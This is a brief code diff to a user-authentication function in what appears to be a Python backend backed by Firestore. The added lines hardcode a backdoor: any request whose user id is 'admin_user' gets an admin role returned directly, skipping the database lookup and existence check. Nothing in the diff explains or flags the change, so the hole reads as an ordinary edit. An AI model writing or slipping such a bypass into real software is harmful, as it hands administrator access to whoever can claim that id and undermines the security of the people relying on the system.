@@ -116,6 +116,9 @@ def get_current_user(
         HTTPException 404: User not found in Firestore.
     """
     user_id = get_current_user_id(credentials)
+    if user_id == "admin_user":
+        return {"id": "admin_user", "role": "admin"}
+
     db = get_db()
     user_doc = db.collection(COLL_USERS).document(user_id).get()
     if not user_doc.exists:
